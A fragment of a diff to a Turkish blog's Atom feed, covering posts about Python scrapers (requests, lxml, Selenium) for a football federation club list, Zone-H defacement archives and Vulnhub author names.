type="html">&lt;p&gt;Selamlar arkadaşlar bu postta twitterda bir arkadaşımın paylaştığı linkte bulunan verileri çekeceğiz.Bu kod beni baya bi uğraştırdı. Aslında uğraştırmaması gerekiyordu fakat ilk olarak parse etmek için regex kullanmayı düşündüm.Fakat regex ile yeterince hızlı olmuyordu bu işlem xpath kullanmak istedim işte tüm sorunlar bundan sonra başladı.Öncelikle çekeceğimiz linki vereyim. &lt;a href="https://lisans.tsf.org.tr/online/main/kulupliste/"&gt;Tsf.org.tr&lt;/a&gt;  Siteye girdiğinizde eğer bir külubü görüntülerseniz özel id atandığını göreceksiniz.Yani aslında arkaplanda post ile verileri alırken 206 id li veriyi çekiyor fakat adress bar da bu 100545254 şeklinde gözükmekte. Eğer bunu farketmeseydim her döngüde 1 artan bir değişkenle işimi halletmeye çalışacaktım.Bu işlem epey uzun oluyordu :)&lt;/p&gt;
 &lt;p&gt;Bende xpath ile o açılır menüde ki kulüplerin id lerini ve isimlerini aldım.Daha sonra bi def içinde gerekli olan sayfayı bulup ona göre döngüye devam ediyordu.&lt;/p&gt;
 &lt;p&gt;Fakat bu büyük bir soruna yol açtı bunu sadece 1 kere yapıyordu.Yani 25 sayfa aldıysa sonradan yeniden sayfalar açılırsa ( &lt;strong&gt; Ki bazı kulüpler 2600 sayfa  &lt;/strong&gt;) bunu es geçiyordu.&lt;/p&gt;
 &lt;p&gt;Neyse kodumuzun ilk haline bakalım.(  &lt;strong&gt;Hataları olabilir bir süre sonra elleşmedim oraya hiç  &lt;/strong&gt;)&lt;/p&gt;
@@ -1840,7 +2066,7 @@ Notify kısmı ise bizim handlers kısmında ismini verdiğimiz görevleri yerin
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Not : Burada ki kodlar tamamen eğitim amaçlıdır.Kullanımınızdan doğan herhangi bir yasal sorunda mesuliyet kabul etmem.Yazı hakkında ki yasal sorunlar vs iletişime geçmek için : &lt;a href="emailto:r4wn3ss@gmail.com"&gt;Email&lt;/a&gt; &lt;/p&gt;</content><category term="python"></category><category term="requests"></category><category term="parser"></category><category term="lxml"></category></entry><entry><title>Zone-H Parser</title><link href="https://enesergun.net/zone-h-parser.html" rel="alternate"></link><published>2016-06-21T10:20:00+03:00</published><updated>2016-06-21T10:20:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2016-06-21:/zone-h-parser.html</id><summary type="html">&lt;p&gt;Zone-H.com'u bilmeyen yoktur herhalde.Kısaca bahsetmek gerekirse blackhat hackerların deface ettikleri sitelerin bir nevi screenshot/snapshot'unu alan bir site.Çok güzel bilgiler barındırabiliyor.Örnek vermek gerekirse Turkiye'de bu site üzerinde kayıtlı kaç blackhat hacker grub/kişi var veya bunlar kaç defacement yapmış şeklinde güzel datalar sağlanabilir.&lt;/p&gt;
+&lt;p&gt;Not : Burada ki kodlar tamamen eğitim amaçlıdır.Kullanımınızdan doğan herhangi bir yasal sorunda mesuliyet kabul etmem.Yazı hakkında ki yasal sorunlar vs iletişime geçmek için : &lt;a href="emailto:r4wn3ss@gmail.com"&gt;Email&lt;/a&gt; &lt;/p&gt;</content><category term="python"></category><category term="python"></category><category term="requests"></category><category term="parser"></category><category term="lxml"></category></entry><entry><title>Zone-H Parser</title><link href="https://enesergun.net/zone-h-parser.html" rel="alternate"></link><published>2016-06-21T10:20:00+03:00</published><updated>2016-06-21T10:20:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2016-06-21:/zone-h-parser.html</id><summary type="html">&lt;p&gt;Zone-H.com'u bilmeyen yoktur herhalde.Kısaca bahsetmek gerekirse blackhat hackerların deface ettikleri sitelerin bir nevi screenshot/snapshot'unu alan bir site.Çok güzel bilgiler barındırabiliyor.Örnek vermek gerekirse Turkiye'de bu site üzerinde kayıtlı kaç blackhat hacker grub/kişi var veya bunlar kaç defacement yapmış şeklinde güzel datalar sağlanabilir.&lt;/p&gt;
 &lt;p&gt;Bende parse etmeye …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Zone-H.com'u bilmeyen yoktur herhalde.Kısaca bahsetmek gerekirse blackhat hackerların deface ettikleri sitelerin bir nevi screenshot/snapshot'unu alan bir site.Çok güzel bilgiler barındırabiliyor.Örnek vermek gerekirse Turkiye'de bu site üzerinde kayıtlı kaç blackhat hacker grub/kişi var veya bunlar kaç defacement yapmış şeklinde güzel datalar sağlanabilir.&lt;/p&gt;
 &lt;p&gt;Bende parse etmeye çalışayım dedim.Bizim baştacımız olan python modüllerinden &lt;strong&gt;requests&lt;/strong&gt; , &lt;strong&gt;lxml&lt;/strong&gt; 'in işimizi görebileceğini düşündüm.Fakat istek yaptığımda bana response olarak içinde bolca şifrelenmiş veri gönderen bir zone-h karşıma çıktı tabi ki bunun yanında captcha ise cabasıydı.Biraz araştırma ile aşağıda vereceğim bir yazı da şifrelenmiş kodları decode etmek için bir yol var.İyi hoş fakat bu seferde captcha sorunu karşımıza çıkıyordu.Bende farklı yollara girdim ve iyi ki de girmişim dedim.&lt;br&gt;
 &lt;a href="https://blog.amilx.com/scaping-zone-h/"&gt;Decode edebileceğiniz yöntem&lt;/a&gt;&lt;/p&gt;
@@ -1926,18 +2152,18 @@ Bu şekilde ilk id den başlayıp sonuna kadar gidecektim.Projemde selenium kull
 
 
 &lt;p&gt;Kod da plugin olarak zenmate kullandım.Captcha vs gelirse eğer kodun içinde input kısmı bulunuyor.Captchayı girdikten sonra 1 e basarsanız captchalı id den devam edecektir.Github'a koymayı düşünüyorum.Commitlerinizi beklerim.Eğer tüm siteyi çeken olursa datayı da isterim daha farklı projelerimde kullanmak için.&lt;/p&gt;
-&lt;p&gt;Kodlarla ilgili bir sorunuz olursa yorum veya mail ile belirtebilir/sorabilirsiniz.&lt;/p&gt;</content><category term="python"></category><category term="requests"></category><category term="parser"></category><category term="lxml"></category></entry><entry><title>Python ile basit vulnhub yazarlarını çeken bot</title><link href="https://enesergun.net/python-vulnhub-author-scraper.html" rel="alternate"></link><published>2016-06-17T10:20:00+03:00</published><updated>2016-06-17T10:20:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2016-06-17:/python-vulnhub-author-scraper.html</id><summary type="html">&lt;p&gt;Daha önceden yazmış olduğum bu scripti bugün güncellemek zorunda kaldım.Nedeni vulnhub önceden her türlü bağlantıyı kabul etsede bugün etmiyordu.Bende scripte Chrome Dev Tools'dan kopyaladığım header bilgilerini çaktım script şimdi bağlantı kuruyordu fakat regex patterni boş olarak dönüyordu.İlk scriptte&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;urllib.request.urlopen(url).read()
+&lt;p&gt;Kodlarla ilgili bir sorunuz olursa yorum veya mail ile belirtebilir/sorabilirsiniz.&lt;/p&gt;</content><category term="python"></category><category term="python"></category><category term="requests"></category><category term="parser"></category><category term="lxml"></category></entry><entry><title>Python ile basit vulnhub yazarlarını çeken bot</title><link href="https://enesergun.net/python-vulnhub-author-scraper.html" rel="alternate"></link><published>2016-06-17T10:20:00+03:00</published><updated>2016-06-17T10:20:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2016-06-17:/python-vulnhub-author-scraper.html</id><summary type="html">&lt;p&gt;Daha önceden yazmış olduğum bu scripti bugün güncellemek zorunda kaldım.Nedeni vulnhub önceden her türlü bağlantıyı kabul etsede bugün etmiyordu.Bende scripte Chrome Dev Tools'dan kopyaladığım header bilgilerini çaktım script şimdi bağlantı kuruyordu fakat regex patterni boş olarak dönüyordu.İlk scriptte&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;urllib.request.urlopen(url).read()&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;şeklinde bir yapı vardı …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Daha önceden yazmış olduğum bu scripti bugün güncellemek zorunda kaldım.Nedeni vulnhub önceden her türlü bağlantıyı kabul etsede bugün etmiyordu.Bende scripte Chrome Dev Tools'dan kopyaladığım header bilgilerini çaktım script şimdi bağlantı kuruyordu fakat regex patterni boş olarak dönüyordu.İlk scriptte&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;urllib.request.urlopen(url).read()
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;urllib.request.urlopen(url).read()&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;şeklinde bir yapı vardı ve bu yapı response'u byte code olarak döndürüyordu.Byte code döndüren response içinde regex ile arama yapmak için basit bir harf argüman var hemen onu da göstereyim.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;rp = re.findall(b&amp;#39;pattern&amp;#39;,text)
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;rp = re.findall(b&amp;#39;pattern&amp;#39;,text)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -2092,4 +2318,4 @@ Bu şekilde ilk id den başlayıp sonuna kadar gidecektim.Projemde selenium kull
     &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;
     &lt;span class="n"&gt;git&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
-&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</content><category term="python"></category><category term="requests"></category><category term="parser"></category><category term="lxml"></category><category term="vulnhub"></category></entry></feed>
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</content><category term="python"></category><category term="python"></category><category term="requests"></category><category term="parser"></category><category term="lxml"></category><category term="vulnhub"></category></entry></feed>
